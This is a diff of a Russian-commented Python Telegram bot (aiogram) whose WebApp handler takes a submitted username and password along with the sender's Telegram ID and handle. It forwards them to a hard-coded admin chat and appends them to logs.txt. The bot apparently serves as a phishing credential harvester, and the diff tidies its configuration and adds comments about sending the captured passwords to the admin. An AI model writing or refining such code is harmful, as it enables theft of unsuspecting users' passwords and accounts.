@@ -8,12 +8,12 @@ from aiogram.filters import Command
 logging.basicConfig(level=logging.INFO)
 
 # ===== НАСТРОЙКИ ИЗ ОКРУЖЕНИЯ =====
-BOT_TOKEN = os.getenv("TOKEN-BOT") #Токен бота
-WEBAPP_URL = os.getenv("URL-RENDER") #Домен с Render'а
-ADMIN_ID = int(os.getenv("8392748332")) #UserId, твой уже сделал
+BOT_TOKEN = os.getenv("TOKEN-BOT")          # Токен бота
+WEBAPP_URL = os.getenv("URL-RENDER")       # Домен с Render'а (полный URL WebApp)
+ADMIN_ID = int(os.getenv("ADMIN_ID", "8392748332"))  # ID админа, по умолчанию твой
 
-if not BOT_TOKEN or not WEBAPP_URL or not ADMIN_ID:
-    raise ValueError("Не все переменные окружения заданы!")
+if not BOT_TOKEN or not WEBAPP_URL:
+    raise ValueError("Не все переменные окружения заданы! Проверь TOKEN-BOT и URL-RENDER")
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -44,11 +44,13 @@ async def handle_webapp_data(message: types.Message):
                 f"[{action.upper()}] Пользователь: {username}, Пароль: {password}, "
                 f"Telegram ID: {message.from_user.id}, Username: @{message.from_user.username or 'не указан'}"
             )
+            # Отправляем админу
             try:
                 await bot.send_message(ADMIN_ID, log_text)
                 logging.info(f"Сообщение админу отправлено: {log_text}")
             except Exception as e:
                 logging.error(f"Не удалось отправить сообщение админу: {e}")
+            # Пишем в лог-файл на всякий случай
             with open("logs.txt", "a", encoding="utf-8") as f:
                 f.write(log_text + "\n")
         else:
